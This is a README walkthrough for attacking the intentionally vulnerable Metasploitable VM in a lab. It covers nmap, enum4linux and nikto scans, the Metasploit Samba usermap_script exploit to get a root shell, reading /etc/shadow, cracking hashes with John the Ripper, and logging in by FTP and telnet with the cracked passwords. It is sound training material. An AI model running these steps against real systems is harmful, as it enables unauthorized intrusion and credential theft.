# Metasploitable Walkthrough by LIONMAD

This README provides a step-by-step guide to identifying and exploiting vulnerabilities in the Metasploitable virtual machine for learning and practice purposes.

---

## Prerequisites

- **VirtualBox** or **VMware** installed on your machine.
- **Metasploitable VM** downloaded and configured.
- **Kali Linux** or any penetration testing OS installed.
- Basic knowledge of Linux and penetration testing tools.

---

## Step 1: Initial Setup

### Network Configuration

- Set the network of both Metasploitable and the attacker machine to **NAT Network** or **Host-Only** to ensure they are on the same subnet.

### Metasploitable: 1 Details

- **Name:** Metasploitable: 1  
- **Date Released:** May 19, 2010  
- **Author:** Metasploit  
- **Series:** Metasploitable  
- **Web Page:** [Metasploitable Blog](http://web.archive.org/web/20100525233058/http://blog.metasploit.com/2010/05/introducing-metasploitable.html)

### Download

- **File:** `Metasploitable.zip` (Size: 545 MB)  
- **Download Link:** [Download from VulnHub](https://download.vulnhub.com/metasploitable/Metasploitable.zip)

> **Note:** VulnHub is a free community resource. Review their FAQs about safely using vulnerable VMs before proceeding.

### Example Target IP:
- **Target IP:** `192.168.48.145`

---

## Step 2: Reconnaissance

### Nmap

#### Command:
```bash
nmap 192.168.48.1/24 -sV
```
#### Example Output:
```
Nmap scan report for 192.168.48.145
Host is up (0.0021s latency).
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         ProFTPD 1.3.1
22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
23/tcp   open  telnet      Linux telnetd
25/tcp   open  smtp        Postfix smtpd
53/tcp   open  domain      ISC BIND 9.4.2
80/tcp   open  http        Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.10 with Suhosin-Patch)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X
445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X
3306/tcp open  mysql       MySQL 5.0.51a-3ubuntu5
5432/tcp open  postgresql  PostgreSQL DB 8.3.0 - 8.3.7
8009/tcp open  ajp13       Apache Jserv (Protocol v1.3)
8180/tcp open  http        Apache Tomcat/Coyote JSP engine 1.1
```

### Enum4Linux

#### Command:
```bash
enum4linux -a 192.168.48.145
```
#### Example Output:
```
Known Usernames: administrator, guest, krbtgt, domain admins, root, bin, none
Workgroup/Domain: WORKGROUP
```

### Nikto

#### Command:
```bash
nikto -h 192.168.48.145
```
#### Example Findings:
- **Apache mod_negotiation**: Enabled with MultiViews.
- **Outdated Software**: Apache 2.2.8, PHP 5.2.4.
- **Directory Indexing**: Found `/icons/`.
- **Vulnerabilities**: X-Frame-Options header missing, potential XST (Cross-Site Tracing).

---

## Step 3: Exploitation

### Exploiting Samba Usermap Script

#### Commands:
```bash
msfconsole -q
use exploit/multi/samba/usermap_script
set rhosts 192.168.48.145
run
```
#### Example Output:
```
[*] Command shell session 1 opened...
root@metasploitable:/#
```

### Example Commands in Shell:
```bash
ls
cat /etc/shadow
```

---

## Step 4: Cracking Hashes

### Using John the Ripper

#### Command:
```bash
john --wordlist='/path/to/rockyou.txt' hash.txt
```
#### Example Output:
```
msfadmin:msfadmin
klog:123456789
sys:batman
service:service
```

---

## Step 5: Accessing Other Services

### FTP Access

#### Command:
```bash
ftp msfadmin@192.168.48.145
```
#### Example Output:
```
Remote directory: /home/msfadmin
```

### Telnet Access

#### Command:
```bash
telnet 192.168.48.145
```
#### Example Output:
```
metasploitable login: service
Password: service
```

---

## Step 6: Cleanup

- Close any open sessions.
- Remove any files created during exploitation.
- Verify no artifacts are left on the target.

---

## Notes

- **Educational Use Only**: Ensure you have proper authorization before testing.
- Metasploitable is intentionally vulnerable; use responsibly in controlled environments.

